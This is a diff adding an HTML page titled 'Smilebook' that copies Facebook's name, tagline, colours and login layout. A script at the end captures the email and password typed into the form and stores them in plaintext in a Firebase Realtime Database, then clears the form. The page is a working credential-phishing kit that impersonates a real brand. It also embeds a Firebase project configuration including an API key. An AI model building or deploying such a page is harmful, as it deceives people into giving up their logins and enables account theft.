@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smilebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #f0f2f5, #ffffff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            margin: 0 20px;
+        }
+
+        .logo-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-section .logo {
+            font-size: 40px;
+            color: #3b5998; /* Facebook blue for Smilebook logo */
+            font-weight: bold;
+        }
+
+        .logo-section p {
+            font-size: 18px;
+            color: #606770;
+            margin-top: 10px;
+        }
+
+        .login-section {
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-form input {
+            height: 50px; /* Make input fields taller */
+            margin-bottom: 10px;
+            padding: 0 15px; /* Add padding */
+            border: 1px solid #dddfe2;
+            border-radius: 8px; /* Slightly rounder edges */
+            font-size: 16px;
+        }
+
+        .login-form .login-btn {
+            background-color: #3b5998; /* Facebook blue for the login button */
+            color: white;
+            height: 50px; /* Make the button taller */
+            font-size: 20px; /* Increase font size */
+            font-weight: bold;
+            border: none;
+            border-radius: 8px; /* Slightly rounder edges */
+            margin-bottom: 10px;
+            cursor: pointer;
+        }
+
+        .login-form .login-btn:hover {
+            background-color: #334d84; /* Darker blue on hover */
+        }
+
+        .login-form .forgot-password {
+            color: #3b5998; /* Facebook blue for forgotten password link */
+            text-align: center;
+            margin-top: 10px;
+            text-decoration: none;
+        }
+
+        .login-form .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        hr {
+            margin: 20px 0;
+            border: 1px solid #dddfe2;
+        }
+
+        .login-form .create-account-btn {
+            background-color: #42b72a; /* Keep the lighter green for the create account button */
+            color: white;
+            height: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        .login-form .create-account-btn:hover {
+            background-color: #36a420;
+        }
+
+        /* Media query for larger screens */
+        @media (min-width: 768px) {
+            body {
+                height: 100vh;
+            }
+            .login-container {
+                flex-direction: row; /* Horizontal layout for larger screens */
+                max-width: 1000px;
+            }
+            .logo-section {
+                text-align: left;
+                margin-right: 50px;
+                flex: 1;
+            }
+            .logo-section .logo {
+                font-size: 60px;
+            }
+            .logo-section p {
+                font-size: 24px;
+            }
+            .login-section {
+                flex: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo-section">
+            <h1 class="logo">Facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="login-section">
+            <form action="#" method="POST" class="login-form">
+                <input type="text" name="email" placeholder="Email or Phone Number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+                <a href="#" class="forgot-password">Forgotten password?</a>
+                <hr>
+                <button class="create-account-btn">Create New Account</button>
+            </form>
+        </div>
+    </div>
+</body>
+<script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-analytics.js";
+  
+  // Your web app's Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyAR7udndWoqWC550IncHKOFKqDNRS4KD-E",
+    authDomain: "password-manager-6437a.firebaseapp.com",
+    projectId: "password-manager-6437a",
+    storageBucket: "password-manager-6437a.firebasestorage.app",
+    messagingSenderId: "784479128183",
+    appId: "1:784479128183:web:6062cde2c8110f416c9472",
+    measurementId: "G-5GWDB6KYRY"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const database = getDatabase(app);
+  const analytics = getAnalytics(app);
+
+  // Function to write user data to the Realtime Database
+  function writeUserData(email, password) {
+    const userId = email.replace(/[@.]/g, "_"); // Convert email into a safe string
+    set(ref(database, 'users/' + userId), {
+      email: email,
+      password: password
+    }).then(() => {
+      alert("User data saved successfully.");
+    }).catch((error) => {
+      console.error("Error saving data:", error);
+    });
+  }
+
+  // Handling form submission
+  document.addEventListener("DOMContentLoaded", function() {
+    const form = document.querySelector('.login-form');
+    form.addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent form from submitting the traditional way
+      
+      const email = form.email.value;
+      const password = form.password.value;
+      
+      // Call the function to save data in Firebase Realtime Database
+      writeUserData(email, password);
+      
+      // Optionally, clear form after submission
+      form.reset();
+    });
+  });
+</script>
+
+</html>
